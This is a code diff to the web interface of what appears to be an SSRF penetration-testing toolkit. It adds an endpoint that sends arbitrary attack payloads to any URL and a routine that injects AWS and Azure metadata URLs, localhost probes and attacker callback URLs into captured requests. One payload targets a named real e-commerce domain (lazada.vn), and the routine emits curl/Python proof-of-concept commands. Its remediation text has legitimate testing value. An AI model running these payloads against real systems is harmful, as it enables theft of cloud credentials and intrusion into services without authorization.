@@ -69,9 +69,21 @@ def set_scan_running(running: bool):
         scan_state['is_running'] = running
 
 def add_finding(finding: dict):
-    """Thread-safe add finding"""
+    """Thread-safe add finding and emit to UI"""
     with scan_state_lock:
         scan_state['findings'].append(finding)
+    
+    # Emit to UI via SocketIO
+    try:
+        socketio.emit('finding', {
+            'severity': finding.get('severity', 'MEDIUM'),
+            'message': finding.get('description') or finding.get('title', 'Vulnerability found'),
+            'category': finding.get('category', 'Unknown'),
+            'affected_url': finding.get('affected_url', ''),
+            'timestamp': finding.get('timestamp', datetime.now().isoformat())
+        })
+    except Exception as e:
+        pass  # Non-fatal: finding still saved to state
 
 def add_endpoint(endpoint: dict):
     """Thread-safe add endpoint"""
@@ -162,6 +174,34 @@ def cleanup_callback_server():
                 web_logger.warning(f"⚠️ Error stopping callback server: {e}")
             finally:
                 global_callback_server = None
+
+def detect_public_callback_url():
+    """
+    Auto-detect public callback URL from ngrok or other tunneling services.
+    Returns: (url, source) tuple or (None, None) if not detected
+    """
+    # Strategy 1: Try ngrok API (most reliable)
+    try:
+        ngrok_response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
+        if ngrok_response.status_code == 200:
+            tunnels = ngrok_response.json().get('tunnels', [])
+            for tunnel in tunnels:
+                # Prefer HTTPS tunnel
+                if tunnel.get('proto') == 'https':
+                    url = tunnel['public_url'].rstrip('/')
+                    return (url, 'ngrok')
+            # Fallback to HTTP if no HTTPS
+            for tunnel in tunnels:
+                if tunnel.get('proto') == 'http':
+                    url = tunnel['public_url'].rstrip('/')
+                    return (url, 'ngrok')
+    except Exception:
+        pass
+    
+    # Strategy 2: Check for other tunneling services (future)
+    # Could add support for localtunnel, expose.dev, etc.
+    
+    return (None, None)
 
 class WebUILogger:
     """Custom logger that emits to web UI"""
@@ -540,9 +580,72 @@ def export_report():
         with open(report_file, 'w') as f:
             json.dump(report_data, f, indent=2)
         
-        return send_file(report_file, as_attachment=True)
+        return jsonify({
+            'success': True,
+            'file': str(report_file)
+        })
     
-    return jsonify({'error': 'Unsupported format'}), 400
+    return jsonify({'success': False, 'error': 'Invalid format'}), 400
+
+@app.route('/api/execute_attack', methods=['POST'])
+def execute_attack():
+    """Execute attack POC for demonstration purposes"""
+    try:
+        data = request.json
+        url = data.get('url')
+        method = data.get('method', 'GET')
+        parameter = data.get('parameter')
+        payload = data.get('payload')
+        
+        if not url or not parameter or not payload:
+            return jsonify({
+                'success': False,
+                'error': 'Missing required parameters'
+            }), 400
+        
+        # Execute the attack request
+        if method.upper() == 'GET':
+            # For GET, replace parameter in URL
+            from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            params[parameter] = [payload]
+            new_query = urlencode(params, doseq=True)
+            attack_url = urlunparse((
+                parsed.scheme, parsed.netloc, parsed.path,
+                parsed.params, new_query, parsed.fragment
+            ))
+            
+            response = requests.get(attack_url, timeout=10, verify=False)
+        else:
+            # For POST/PUT/PATCH, send JSON body
+            json_body = {parameter: payload}
+            response = requests.request(
+                method.upper(),
+                url,
+                json=json_body,
+                timeout=10,
+                verify=False
+            )
+        
+        # Return response
+        return jsonify({
+            'success': True,
+            'status_code': response.status_code,
+            'response_body': response.text[:2000],  # Limit to 2000 chars
+            'headers': dict(response.headers)
+        })
+        
+    except requests.exceptions.Timeout:
+        return jsonify({
+            'success': False,
+            'error': 'Request timed out'
+        }), 408
+    except Exception as e:
+        return jsonify({
+            'success': False,
+            'error': str(e)
+        }), 500
 
 def run_scan(config: ToolkitConfig):
     """Run the actual scan (background task)"""
@@ -561,6 +664,14 @@ def run_scan(config: ToolkitConfig):
         
         # Final phase
         update_progress('Scan Complete', 100)
+        # Notify frontend that scan is complete so UI can stop timers and finalize state
+        try:
+            socketio.emit('scan_complete', {
+                'message': 'Scan completed successfully',
+                'findings': len(scan_state.get('findings', []))
+            }, broadcast=True)
+        except Exception:
+            pass
         web_logger.info(f"✅ Scan completed successfully! Found {len(scan_state['findings'])} findings")
         
     except Exception as e:
@@ -569,6 +680,14 @@ def run_scan(config: ToolkitConfig):
         web_logger.error(f"❌ Scan failed: {str(e)}")
         web_logger.error(f"Details: {error_detail}")
         update_progress('Scan Failed', scan_state.get('progress', 0))
+        # Notify frontend about the error so UI can stop timers and show error state
+        try:
+            socketio.emit('scan_error', {
+                'message': str(e),
+                'details': error_detail
+            }, broadcast=True)
+        except Exception:
+            pass
     finally:
         # Always reset state when scan ends (thread-safe)
         with scan_state_lock:
@@ -577,12 +696,422 @@ def run_scan(config: ToolkitConfig):
             scan_state['callback_server'] = None
         web_logger.info("🏁 Scan process terminated (callback server kept alive)")
 
+def run_focused_ssrf_testing(config: ToolkitConfig, db: FindingDatabase, har_data: dict):
+    """Run focused SSRF testing on specific requests from Burp Suite/HAR file"""
+    web_logger.info("🎯 Starting Focused SSRF Testing on specific endpoints")
+    
+    # Initialize callback server for SSRF testing
+    callback_server = get_or_create_callback_server(port=8888)
+    set_callback_server(callback_server)
+    web_logger.info(f"📡 Callback server ready on http://0.0.0.0:8888")
+    
+    callback_addresses = callback_server.get_all_callback_addresses()
+    formatted_addresses = [f"{addr}:8888" for addr in callback_addresses]
+    web_logger.info(f"🌐 Callback addresses: {', '.join(formatted_addresses)}")
+
+    # Auto-detect public callback URL (ngrok or configured)
+    public_callback_base = None
+    callback_source = None
+    
+    # Try auto-detection first
+    public_callback_base, callback_source = detect_public_callback_url()
+    
+    if public_callback_base:
+        web_logger.info(f"✅ Auto-detected {callback_source} tunnel: {public_callback_base}")
+    else:
+        # Fallback to configured callback server
+        try:
+            if config and getattr(config, 'blackbox', None) and config.blackbox.callback_server:
+                public_callback_base = config.blackbox.callback_server.rstrip('/')
+                callback_source = 'config'
+                web_logger.info(f"🔗 Using configured callback server: {public_callback_base}")
+        except Exception:
+            pass
+    
+    # Add to callback_addresses for compatibility
+    if public_callback_base:
+        try:
+            import urllib.parse as _up
+            parsed = _up.urlparse(public_callback_base)
+            host_only = parsed.netloc or parsed.path
+            if host_only and host_only not in callback_addresses:
+                callback_addresses.insert(0, host_only)
+        except Exception:
+            pass
+    
+    if not public_callback_base:
+        web_logger.info(f"⚠️ No public callback detected. Using local addresses (may not work for remote targets).")
+    
+    # Test callback server connectivity
+    web_logger.info("🧪 Testing callback server connectivity...")
+    try:
+        import requests as req
+        test_response = req.get(f"http://127.0.0.1:8888/test", timeout=2)
+        web_logger.info(f"✅ Callback server responding: {test_response.status_code}")
+    except Exception as e:
+        web_logger.info(f"❌ Callback server test failed: {e}")
+    
+    update_progress('Analyzing Burp Suite requests', 10)
+    
+    # Process each request from the file
+    requests_analyzed = 0
+    ssrf_findings = []
+    
+    for request in har_data.get('requests', []):
+        try:
+            requests_analyzed += 1
+            url = request.get('url', '')
+            method = request.get('method', 'GET')
+            headers = request.get('headers', {})
+            post_data = request.get('post_data', {})
+            
+            web_logger.info(f"🔍 Analyzing request {requests_analyzed}: {method} {url}")
+            
+            # Debug: Show full request data
+            web_logger.info(f"  🔧 Request headers: {list(headers.keys())}")
+            web_logger.info(f"  🔧 POST data type: {type(post_data)}")
+            web_logger.info(f"  🔧 POST data: {post_data}")
+            
+            # Focus on POST/PUT requests with JSON body (most likely to have SSRF parameters)
+            if method in ['POST', 'PUT', 'PATCH'] and post_data:
+                # Try to parse JSON body
+                try:
+                    import json
+                    body_data = None
+                    
+                    if isinstance(post_data, str):
+                        body_data = json.loads(post_data)
+                    elif isinstance(post_data, dict):
+                        # If already a dict, use it directly
+                        body_data = post_data
+                    else:
+                        web_logger.info(f"  ❌ Unsupported POST data type: {type(post_data)}")
+                        continue
+                    
+                    web_logger.info(f"  🔧 Parsed JSON body: {body_data}")
+                        
+                    # Look for URL parameters in the body
+                    url_params = []
+                    for key, value in body_data.items():
+                        if isinstance(value, str) and ('http' in value.lower() or 'url' in key.lower()):
+                            url_params.append((key, value))
+                            web_logger.info(f"  📍 Found potential URL parameter: {key} = {value}")
+                    
+                    if not url_params:
+                        web_logger.info(f"  ❌ No URL parameters found in request body")
+                        continue
+                    
+                    # Test each URL parameter for SSRF
+                    if url_params:
+                        for param_name, original_value in url_params:
+                            web_logger.info(f"  🧪 Testing SSRF on parameter: {param_name}")
+                            
+                            # Test with multiple SSRF strategies
+                            ssrf_payloads = []
+                            
+                            # Strategy 1: AWS Cloud metadata (CRITICAL)
+                            ssrf_payloads.append({
+                                'name': 'AWS Metadata',
+                                'url': 'http://169.254.169.254/latest/meta-data/',
+                                'path_check': '/latest/meta-data/',
+                                'critical': True,
+                                'evidence_keywords': ['ami-id', 'instance-id', 'instance-type', 'security-groups']
+                            })
+                            
+                            ssrf_payloads.append({
+                                'name': 'AWS User Data',
+                                'url': 'http://169.254.169.254/latest/user-data/',
+                                'path_check': '/latest/user-data/',
+                                'critical': True,
+                                'evidence_keywords': ['#!/bin/bash', 'user-data', 'cloud-init']
+                            })
+                            
+                            # Strategy 2: Azure metadata
+                            ssrf_payloads.append({
+                                'name': 'Azure Metadata',
+                                'url': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+                                'path_check': '/metadata/instance',
+                                'critical': True,
+                                'evidence_keywords': ['compute', 'network', 'vmId', 'subscriptionId']
+                            })
+                            
+                            # Strategy 3: Direct callback URLs
+                            # Prefer a configured public callback base (ngrok/webhook.site) when available
+                            if public_callback_base:
+                                ssrf_payloads.append({
+                                    'name': 'Direct Callback (public)',
+                                    'url': f"{public_callback_base}/ssrf_test_{requests_analyzed}_{param_name}",
+                                    'path_check': f"/ssrf_test_{requests_analyzed}_{param_name}",
+                                    'critical': False,
+                                    'evidence_keywords': []
+                                })
+                            else:
+                                for callback_addr in callback_addresses[:2]:
+                                    ssrf_payloads.append({
+                                        'name': 'Direct Callback',
+                                        'url': f"http://{callback_addr}:8888/ssrf_test_{requests_analyzed}_{param_name}",
+                                        'path_check': f"/ssrf_test_{requests_analyzed}_{param_name}",
+                                        'critical': False,
+                                        'evidence_keywords': []
+                                    })
+                            
+                            # Strategy 4: Localhost services
+                            ssrf_payloads.append({
+                                'name': 'Localhost HTTP',
+                                'url': 'http://127.0.0.1:8080',
+                                'path_check': None,
+                                'critical': False,
+                                'evidence_keywords': ['server', 'apache', 'nginx', 'tomcat']
+                            })
+                            
+                            # Strategy 5: Subdomain takeover attempt (mimic legitimate domain)
+                            if 'lazada.vn' in original_value.lower():
+                                if public_callback_base:
+                                    ssrf_payloads.append({
+                                        'name': 'Subdomain Mimic (public)',
+                                        'url': f"{public_callback_base}/products/api/price/check",
+                                        'path_check': f"/products/api/price/check",
+                                        'critical': False,
+                                        'evidence_keywords': []
+                                    })
+                                else:
+                                    for callback_addr in callback_addresses[:1]:
+                                        ssrf_payloads.append({
+                                            'name': 'Subdomain Mimic',
+                                            'url': f"http://api.{callback_addr}:8888/products/api/price/check",
+                                            'path_check': f"/products/api/price/check",
+                                            'critical': False,
+                                            'evidence_keywords': []
+                                        })
+                            
+                            # Test each payload
+                            ssrf_confirmed_for_param = False  # Track if we found SSRF for this param
+                            for payload_info in ssrf_payloads:
+                                # Skip remaining tests if we already confirmed SSRF for this parameter
+                                if ssrf_confirmed_for_param:
+                                    break
+                                    
+                                test_url = payload_info['url']
+                                test_name = payload_info['name']
+                                path_check = payload_info['path_check']
+                                is_critical = payload_info.get('critical', False)
+                                evidence_keywords = payload_info.get('evidence_keywords', [])
+                                
+                                # Prepare modified body
+                                modified_body = body_data.copy()
+                                modified_body[param_name] = test_url
+                                
+                                # Send SSRF test request
+                                try:
+                                    import requests as req
+                                    web_logger.info(f"    💉 Testing [{test_name}]: {test_url}")
+                                    
+                                    # Send the request with SSRF payload
+                                    response = req.request(
+                                        method=method,
+                                        url=url,
+                                        json=modified_body,
+                                        headers=headers,
+                                        timeout=config.blackbox.timeout,
+                                        verify=False,
+                                        allow_redirects=True
+                                    )
+                                    
+                                    web_logger.info(f"    📈 Response: {response.status_code}")
+                                    
+                                    # Analyze response for SSRF evidence
+                                    ssrf_confirmed = False
+                                    evidence_found = []
+                                    
+                                    # Check response content for evidence
+                                    if response.status_code == 200:
+                                        response_text = response.text.lower()
+                                        
+                                        # Look for evidence keywords in response
+                                        for keyword in evidence_keywords:
+                                            if keyword.lower() in response_text:
+                                                evidence_found.append(keyword)
+                                        
+                                        # If we found evidence keywords, this is confirmed SSRF
+                                        if evidence_found:
+                                            ssrf_confirmed = True
+                                            web_logger.info(f"    🔥 EVIDENCE FOUND: {', '.join(evidence_found)}")
+                                        
+                                        # Check for JSON response with compare_url echo
+                                        try:
+                                            response_json = response.json()
+                                            if 'compare_url' in response_json and test_url in str(response_json['compare_url']):
+                                                web_logger.info(f"    ✅ Server processed our payload: {response_json.get('compare_url', '')}")
+                                                
+                                                # Check content_preview for SSRF evidence
+                                                content_preview = response_json.get('content_preview', '')
+                                                if content_preview and any(kw.lower() in content_preview.lower() for kw in evidence_keywords):
+                                                    ssrf_confirmed = True
+                                                    web_logger.info(f"    � SSRF CONFIRMED! Content preview contains: {content_preview[:200]}...")
+                                        except:
+                                            pass
+                                    
+                                    # Also check for callback if path_check is provided
+                                    if path_check and not ssrf_confirmed:
+                                        import time
+                                        time.sleep(1)  # Wait for callback
+                                        
+                                        if callback_server.check_callback_received(path_check, timeout=3):
+                                            ssrf_confirmed = True
+                                            web_logger.info(f"    ✅ Callback received for {test_name}")
+                                    
+                                    # If SSRF confirmed, create finding
+                                    if ssrf_confirmed:
+                                        severity = 'CRITICAL' if is_critical else 'HIGH'
+                                        finding_msg = f"🔥 {severity} SSRF: {method} {url} (parameter: {param_name})"
+                                        # Log to console only (don't emit duplicate via web_logger.finding)
+                                        web_logger.info(finding_msg)
+                                        web_logger.info(f"    ✅ SSRF confirmed with {test_name} strategy!")
+                                        web_logger.info(f"    💥 Original value: {original_value}")
+                                        web_logger.info(f"    💥 SSRF payload: {test_url}")
+                                        
+                                        if evidence_found:
+                                            web_logger.info(f"    🎯 Evidence: {', '.join(evidence_found)}")
+                                        
+                                        ssrf_findings.append({
+                                            'endpoint': url,
+                                            'method': method,
+                                            'parameter': param_name,
+                                            'original_value': original_value,
+                                            'ssrf_payload': test_url,
+                                            'strategy': test_name,
+                                            'evidence': evidence_found,
+                                            'is_critical': is_critical,
+                                            'callback_received': path_check and callback_server.check_callback_received(path_check, timeout=1),
+                                            'status_code': response.status_code,
+                                            'response_preview': response.text[:500] if response.status_code == 200 else ''
+                                        })
+                                        
+                                        # Save to database — map to Finding dataclass schema
+                                        try:
+                                            # Build request/response strings for evidence
+                                            request_str = f"{method} {url}\n"
+                                            for h_name, h_val in headers.items():
+                                                request_str += f"{h_name}: {h_val}\n"
+                                            request_str += f"\nBody: {json.dumps(modified_body)}"
+                                            
+                                            response_str = f"HTTP {response.status_code}\n"
+                                            response_str += f"Content preview:\n{response.text[:500]}"
+                                            
+                                            evidence_keywords_str = ', '.join(evidence_found) if evidence_found else 'N/A'
+                                            
+                                            finding = Finding(
+                                                id=None,  # Auto-generate in DB
+                                                timestamp=datetime.now().isoformat(),
+                                                mode='blackbox',
+                                                severity=severity,
+                                                category='SSRF',
+                                                title=f"SSRF via {test_name} in {param_name}",
+                                                description=f"Server-Side Request Forgery detected in parameter '{param_name}' using {test_name} strategy. Original value: {original_value}. Payload: {test_url}. Evidence keywords: {evidence_keywords_str}",
+                                                affected_url=url,
+                                                request=request_str,
+                                                response=response_str,
+                                                proof_of_concept=f"POST {url}\nParameter: {param_name}\nPayload: {test_url}\nEvidence: {evidence_keywords_str}",
+                                                remediation="Implement strict allowlist for outbound requests. Validate and sanitize all user-supplied URLs. Use network segmentation to prevent access to internal/cloud metadata endpoints.",
+                                                cvss_score=9.1 if is_critical else 8.2,
+                                                cwe_id='CWE-918',
+                                                references=['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', 'https://portswigger.net/web-security/ssrf']
+                                            )
+                                            db.add_finding(finding)
+                                            web_logger.info(f"    💾 Finding saved to database")
+                                            
+                                            # Emit detailed finding to UI via SocketIO
+                                            add_finding({
+                                                'severity': severity,
+                                                'category': 'SSRF',
+                                                'title': f"Server-Side Request Forgery in {param_name}",
+                                                'description': f"SSRF detected using {test_name} strategy. The application makes outbound requests to attacker-controlled URLs, allowing access to internal resources and cloud metadata.",
+                                                'affected_url': url,
+                                                'method': method,
+                                                'parameter': param_name,
+                                                'original_value': original_value,
+                                                'payload': test_url,
+                                                'evidence': evidence_keywords_str,
+                                                'request': request_str,
+                                                'response': response_str[:1000],  # Limit response size
+                                                'proof_of_concept': f"# SSRF Exploitation - {test_name}\n\n# Using curl:\ncurl -X {method} '{url}' \\\n  -H 'Content-Type: application/json' \\\n  -d '{{ \"{param_name}\": \"{test_url}\" }}'\n\n# Using Python:\nimport requests\nrequests.{method.lower()}('{url}', json={{'{param_name}': '{test_url}'}})\n\n# Evidence found: {evidence_keywords_str}",
+                                                'remediation': "1. Implement strict allowlist for outbound requests\n2. Validate and sanitize all user-supplied URLs\n3. Use network segmentation to prevent access to internal/cloud metadata endpoints\n4. Disable unnecessary URL schemas (file://, gopher://, etc.)\n5. Monitor outbound requests for suspicious patterns",
+                                                'cvss_score': 9.1 if is_critical else 8.2,
+                                                'cwe_id': 'CWE-918',
+                                                'references': ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', 'https://portswigger.net/web-security/ssrf'],
+                                                'attack_vector': test_url,  # For "Attack" button
+                                                'timestamp': datetime.now().isoformat()
+                                            })
+                                            
+                                        except Exception as save_err:
+                                            web_logger.error(f"    ❌ Failed to save finding to database: {save_err}")
+                                            # Continue testing even if DB save fails
+                                        
+                                        # Mark SSRF confirmed for this param to stop further tests
+                                        ssrf_confirmed_for_param = True
+                                        
+                                        # If critical, break immediately
+                                        if is_critical:
+                                            web_logger.info(f"    🚨 CRITICAL SSRF found - stopping further tests for this parameter")
+                                            break
+                                    else:
+                                        web_logger.info(f"    ❌ No SSRF evidence found for {test_name}")
+                                    
+                                    # Small delay between tests
+                                    import time
+                                    time.sleep(0.5)
+                                    
+                                except Exception as e:
+                                    # Emit error clearly to UI
+                                    error_msg = f"Test failed: {str(e)}"
+                                    web_logger.error(f"    ❌ {error_msg}")
+                                    continue
+                    
+                except json.JSONDecodeError:
+                    web_logger.info(f"  ⚠️ Could not parse JSON body for {url}")
+                    continue
+            
+            # Update progress
+            progress = 10 + (requests_analyzed / len(har_data['requests'])) * 80
+            update_progress(f'Testing request {requests_analyzed}/{len(har_data["requests"])}', int(progress))
+            
+        except Exception as e:
+            web_logger.error(f"❌ Error analyzing request: {str(e)}")
+            continue
+    
+    # Summary
+    update_progress('Focused SSRF Testing Complete', 100)
+    web_logger.info(f"✅ Focused SSRF Testing Complete!")
+    web_logger.info(f"📊 Analyzed {requests_analyzed} requests from Burp Suite file")
+    web_logger.info(f"🔥 Found {len(ssrf_findings)} SSRF vulnerabilities")
+    
+    if ssrf_findings:
+        web_logger.info("🎯 SSRF Vulnerabilities Summary:")
+        for i, finding in enumerate(ssrf_findings, 1):
+            web_logger.info(f"  {i}. {finding['method']} {finding['endpoint']}")
+            web_logger.info(f"     Parameter: {finding['parameter']}")
+            web_logger.info(f"     Original: {finding['original_value']}")
+            web_logger.info(f"     Payload: {finding['ssrf_payload']}")
+
 def run_blackbox(config: ToolkitConfig, db: FindingDatabase):
     """Run black box testing"""
     web_logger.info("🎯 Starting Black Box Testing")
     target_url = config.blackbox.target_url
     fuzz_results = []
     discovered_endpoints = []
+    
+    # Get HAR/Burp data to check if we should focus on specific endpoints
+    har_data = get_scan_state_value('har_data')
+    endpoint_source = get_scan_state_value('endpoint_source', 'file')
+    
+    # If we have specific Burp/HAR data, prioritize direct testing over discovery
+    if har_data and har_data.get('requests') and endpoint_source == 'file':
+        web_logger.info("🎯 TARGETED MODE: Using specific endpoints from Burp Suite/HAR file")
+        web_logger.info(f"📁 Found {len(har_data['requests'])} requests to analyze directly")
+        
+        # Run focused SSRF testing on the specific requests from file
+        run_focused_ssrf_testing(config, db, har_data)
+        return
     
     # Check if Auto Discovery mode is enabled
     if config.blackbox.auto_discovery:
@@ -600,6 +1129,13 @@ def run_blackbox(config: ToolkitConfig, db: FindingDatabase):
             
             web_logger.info(f"📡 Callback server ready on http://0.0.0.0:8888")
             
+            # Auto-detect public callback URL (ngrok)
+            public_callback_base, callback_source = detect_public_callback_url()
+            if public_callback_base:
+                web_logger.info(f"✅ Auto-detected {callback_source} tunnel: {public_callback_base}")
+            else:
+                web_logger.info(f"⚠️ No public callback detected. Using local addresses.")
+            
             # Get all callback addresses for Docker/LAN environments
             callback_addresses = callback_server.get_all_callback_addresses()
             web_logger.info(f"🌐 Callback addresses: {', '.join(callback_addresses)}")
@@ -610,9 +1146,12 @@ def run_blackbox(config: ToolkitConfig, db: FindingDatabase):
                 timeout=config.blackbox.timeout
             )
             
-            # Run full auto discovery and testing
+            # Run full auto discovery and testing (với ngrok URL ưu tiên)
             web_logger.info("🚀 Starting comprehensive auto-discovery...")
-            auto_results = auto_disco.run_full_discovery()
+            auto_results = auto_disco.run_full_discovery(
+                callback_url=public_callback_base,  # ✅ Truyền ngrok URL vào!
+                callback_server=callback_server
+            )
             
             # Process results
             discovered_endpoints = auto_results.get('endpoints', [])
@@ -1037,7 +1576,8 @@ def update_progress(phase: str, progress: int):
         scan_state['progress'] = progress
     socketio.emit('progress', {
         'phase': phase,
-        'progress': progress
+        'progress': progress,
+        'percent': progress  # Add 'percent' for frontend compatibility
     })
 
 @socketio.on('connect')
@@ -1069,6 +1609,18 @@ if __name__ == '__main__':
     
     print("🚀 Starting Microservice SSRF Pentest Toolkit Web UI")
     print("📊 Dashboard: http://localhost:5000")
+    
+    # NOTE: Callback server is now standalone (tools/callback_server.py)
+    # It should be started separately via run_with_ngrok_and_app.ps1
+    # Comment out the old embedded callback server to avoid port conflicts
+    # try:
+    #     print("📡 Pre-starting callback server...")
+    #     callback_server = get_or_create_callback_server(port=8888)
+    #     print(f"✅ Callback server ready on http://0.0.0.0:8888")
+    # except Exception as e:
+    #     print(f"⚠️ Warning: Could not start callback server: {e}")
+    #     print("   (It will be started automatically when scan begins)")
+    
     print("=" * 60)
     
     try:
